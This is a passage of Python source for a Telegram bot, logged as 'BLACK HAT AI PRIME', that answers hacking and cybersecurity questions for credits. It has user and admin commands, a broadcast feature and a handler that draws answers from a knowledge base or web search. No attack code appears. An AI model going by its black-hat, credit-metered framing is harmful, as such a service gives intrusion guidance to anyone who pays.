    greeting = random.choice(GREETINGS_KU if lang == "ku" else GREETINGS_EN)
    
    if is_admin(message.from_user.id):
        greeting += "\n\n👑 تۆ ئەدمینیت. /panel ببینە."
        
    send_msg(message.chat.id, greeting)

@bot.message_handler(commands=["help"])
def cmd_help(message):
    if check_blocked(message): return
    help_text = (
        "<b>📖 یارمەتی بۆت</b>\n\n"
        "ئەم بۆتە تەنها بۆ پرسیاری هاکینگ و ئاسایشی سایبەر دروست کراوە.\n"
        "تەنها پرسیارەکەت بنووسە (بۆ نموونە: چۆن پۆڕت بپشکنین) و بۆتەکە وەڵامت دەداتەوە.\n\n"
        "<b>فەرمانەکان:</b>\n"
        "/start — دەستپێکردن\n"
        "/help — یارمەتی\n"
        "/id — ناسنامەی تیلیگرامت\n"
        "/lang ku|en — گۆڕینی زمان\n"
    )
    send_msg(message.chat.id, help_text)

@bot.message_handler(commands=["id"])
def cmd_id(message):
    if check_blocked(message): return
    send_msg(message.chat.id, f"🆔 ناسنامەی تیلیگرامت: <code>{message.from_user.id}</code>")

@bot.message_handler(commands=["lang"])
def cmd_lang(message):
    if check_blocked(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        return send_msg(message.chat.id, "🌐 شێواز: /lang ku یان /lang en")
    
    choice = parts[1].strip().lower()
    if choice in ("ku", "en"):
        set_lang(message.from_user.id, choice)
        send_msg(message.chat.id, "✅ زمان گۆڕدرا.")
    else:
        send_msg(message.chat.id, "🌐 تەنها ku یان en.")

# ==============================================================================
# 10. HANDLERS (ADMIN)
# ==============================================================================

@bot.message_handler(commands=["panel"])
def cmd_panel(message):
    if not is_admin(message.from_user.id): return
    panel_text = (
        "🎛 <b>پانێلی ئەدمین</b>\n\n"
        "📊 <code>/system</code> — ئامار\n"
        "👥 <code>/users</code> — بەکارهێنەران\n"
        "🚫 <code>/ban &lt;id&gt; &lt;forever|1h|1d|7d|30d&gt;</code>\n"
        "✅ <code>/unban &lt;id&gt;</code>\n"
        "💳 <code>/credit &lt;id&gt; &lt;n&gt;</code> — زیادکردن\n"
        "💳 <code>/credit2 &lt;id&gt; &lt;n&gt;</code> — کەمکردن\n"
        "📨 <code>/letter &lt;text&gt;</code> — بۆ هەمووان\n"
        "📨 <code>/letter2 &lt;id&gt; &lt;text&gt;</code> — بۆ یەک\n"
        "📜 <code>/history &lt;id&gt;</code> — داواکارییەکان\n"
        "📁 <code>/export</code> — دەرهێنانی CSV"
    )
    send_msg(message.chat.id, panel_text)

@bot.message_handler(commands=["system"])
def cmd_system(message):
    if not is_admin(message.from_user.id): return
    with db() as conn:
        total = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        banned = conn.execute("SELECT COUNT(*) FROM users WHERE banned_until IS NOT NULL").fetchone()[0]
        reqs = conn.execute("SELECT COUNT(*) FROM requests").fetchone()[0]
        credits = conn.execute("SELECT SUM(credits) FROM users").fetchone()[0] or 0
    
    text = (
        "📊 <b>ئاماری سیستەم</b>\n\n"
        f"👥 بەکارهێنەران: <b>{total}</b>\n"
        f"🚫 باندکراو: <b>{banned}</b>\n"
        f"💬 داواکاری: <b>{reqs}</b>\n"
        f"💳 کۆی کرێدیت: <b>{credits}</b>"
    )
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=["users"])
def cmd_users(message):
    if not is_admin(message.from_user.id): return
    with db() as conn:
        rows = conn.execute("SELECT user_id, username, first_name, credits FROM users ORDER BY last_seen DESC LIMIT 30").fetchall()
    
    lines = ["👥 <b>دوایین ٣٠ بەکارهێنەر</b>\n"]
    for r in rows:
        un = f"@{r[1]}" if r[1] else r[2]
        lines.append(f"<code>{r[0]}</code> · {safe_html(un)} · 💳{r[3]}")
    bot.send_message(message.chat.id, "\n".join(lines))

@bot.message_handler(commands=["export"])
def cmd_export(message):
    if not is_admin(message.from_user.id): return
    with db() as conn:
        rows = conn.execute("SELECT user_id, first_name, username, credits, last_seen FROM users").fetchall()
    
    if not rows:
        return bot.reply_to(message, "هیچ بەکارهێنەرێک نییە.")
        
    csv_data = "user_id,first_name,username,credits,last_seen\n"
    for r in rows:
        csv_data += f"{r[0]},{r[1] or ''},{r[2] or ''},{r[3]},{r[4]}\n"
        
    bot.send_document(message.chat.id, ("users_export.csv", csv_data.encode()), caption=f"📁 {len(rows)} بەکارهێنەر")

@bot.message_handler(commands=["ban", "unban", "credit", "credit2", "letter", "letter2", "history"])
def cmd_admin_actions(message):
    if not is_admin(message.from_user.id): return
    parts = message.text.split(maxsplit=2)
    cmd = parts[0][1:]
    admin_id = message.from_user.id

    if cmd == "ban" and len(parts) == 3:
        try: uid = int(parts[1])
        except: return bot.reply_to(message, "ID هەڵەیە.")
        if ban_user(uid, parts[2].lower()):
            log_admin(admin_id, "ban", str(uid))
            bot.reply_to(message, f"🚫 باند کرا: <code>{uid}</code> ({parts[2]})")
        else:
            bot.reply_to(message, "ماوە نەناسراوە: forever|1h|1d|7d|30d")

    elif cmd == "unban" and len(parts) >= 2:
        try: uid = int(parts[1])
        except: return bot.reply_to(message, "ID هەڵەیە.")
        with db() as conn: conn.execute("UPDATE users SET banned_until=NULL WHERE user_id=?", (uid,))
        log_admin(admin_id, "unban", str(uid))
        bot.reply_to(message, f"✅ لابرا: <code>{uid}</code>")

    elif cmd in ("credit", "credit2") and len(parts) == 3:
        try:
            uid = int(parts[1])
            amt = int(parts[2])
        except: return bot.reply_to(message, "ID یان ژمارە هەڵەیە.")
        sign = 1 if cmd == "credit" else -1
        with db() as conn:
            row = conn.execute("SELECT credits FROM users WHERE user_id=?", (uid,)).fetchone()
            if row:
                new_val = max(0, row[0] + (sign * amt))
                conn.execute("UPDATE users SET credits=? WHERE user_id=?", (new_val, uid))
                log_admin(admin_id, cmd, f"{uid} -> {new_val}")
                bot.reply_to(message, f"💳 <code>{uid}</code> → <b>{new_val}</b>")
            else:
                bot.reply_to(message, "بەکارهێنەر نەدۆزرایەوە.")

    elif cmd == "letter" and len(parts) >= 2:
        text = parts[1] if len(parts) == 2 else parts[1] + " " + parts[2]
        with db() as conn: ids = [r[0] for r in conn.execute("SELECT user_id FROM users").fetchall()]
        sent = 0
        for uid in ids:
            try:
                bot.send_message(uid, f"📨 <b>پەیام لە ئەدمین:</b>\n\n{safe_html(text)}")
                sent += 1
                time.sleep(0.05)
            except: pass
        log_admin(admin_id, "broadcast", f"sent {sent}")
        bot.reply_to(message, f"✅ نێردرا: {sent}")

    elif cmd == "letter2" and len(parts) == 3:
        try: uid = int(parts[1])
        except: return bot.reply_to(message, "ID هەڵەیە.")
        try:
            bot.send_message(uid, f"📨 <b>پەیام لە ئەدمین:</b>\n\n{safe_html(parts[2])}")
            log_admin(admin_id, "direct_msg", str(uid))
            bot.reply_to(message, "✅ نێردرا.")
        except: bot.reply_to(message, "❌ شکست.")

    elif cmd == "history" and len(parts) >= 2:
        try: uid = int(parts[1])
        except: return bot.reply_to(message, "ID هەڵەیە.")
        with db() as conn:
            rows = conn.execute("SELECT type, content, created_at FROM requests WHERE user_id=? ORDER BY id DESC LIMIT 15", (uid,)).fetchall()
        if not rows: return bot.reply_to(message, "هیچ داواکارییەک نییە.")
        text = f"📜 <b>داواکارییەکانی</b> <code>{uid}</code>\n\n"
        for r in rows: text += f"• [{r[0]}] {r[2]}\n  {safe_html((r[1] or '')[:100])}\n"
        bot.send_message(message.chat.id, text)

# ==============================================================================
# 11. MAIN MESSAGE HANDLER
# ==============================================================================

@bot.message_handler(content_types=["text"], func=lambda m: not m.text.startswith("/"))
def handle_message(message):
    if check_blocked(message): return
    
    uid = message.from_user.id
    ensure_user(message.from_user)
    apply_daily(uid)
    
    query = message.text.strip()
    query_lower = query.lower()
    lang = get_lang(uid)
    
    if not is_admin(uid) and rate_limited(uid):
        return send_msg(message.chat.id, "⏳ زۆر خێرایت — کەمێک بوەستە.")

    if len(query.split()) < 5 and any(g in query_lower for g in GREETING_KEYWORDS):
        greeting = random.choice(GREETINGS_KU if lang == "ku" else GREETINGS_EN)
        return send_msg(message.chat.id, greeting)

    if any(k in query_lower for k in HACKING_KEYWORDS):
        if not is_admin(uid):
            if not spend_credit(uid):
                return send_msg(message.chat.id, f"⛔ کرێدیتت نەماوە. باڵانس: {get_credits(uid)}")

        status = bot.reply_to(message, "🔍 لە زانیارییەکان و وێبدا دەگەڕێم بۆ وەڵامی پرسیارەکەت...")
        
        # 1. Check the offline knowledge base first
        offline_answer = get_knowledge_answer(query_lower)
        if offline_answer:
            try: bot.delete_message(message.chat.id, status.message_id)
            except: pass
            log_request(uid, "offline_search", query)
            return send_msg(message.chat.id, offline_answer)

        # 2. Fallback to Web Search
        web_answer = perform_web_search(query)
        
        try: bot.delete_message(message.chat.id, status.message_id)
        except: pass

        if web_answer:
            log_request(uid, "web_search", query)
            send_msg(message.chat.id, web_answer)
        else:
            send_msg(message.chat.id, "❌ ببورە، نەمتوانی وەڵامێک بدۆزمەوە. تکایە بە شێوەیەکی تر پرسیار بکە.")
        return

    send_msg(message.chat.id, REJECTION_MSG)

# ==============================================================================
# 12. MAIN EXECUTION
# ==============================================================================

if __name__ == "__main__":
    log.info("========================================")
    log.info("STARTING BLACK HAT AI PRIME (MEGA BUILD)")
    log.info("========================================")
    
    init_db()
    log.info(f"Admins registered: {len(ADMIN_IDS)}")
    log.info("Bot is now polling for updates...")
    
    try:
        bot.remove_webhook()
        bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=20)
    except Exception as e:
        log.exception("FATAL ERROR: Polling crashed.")
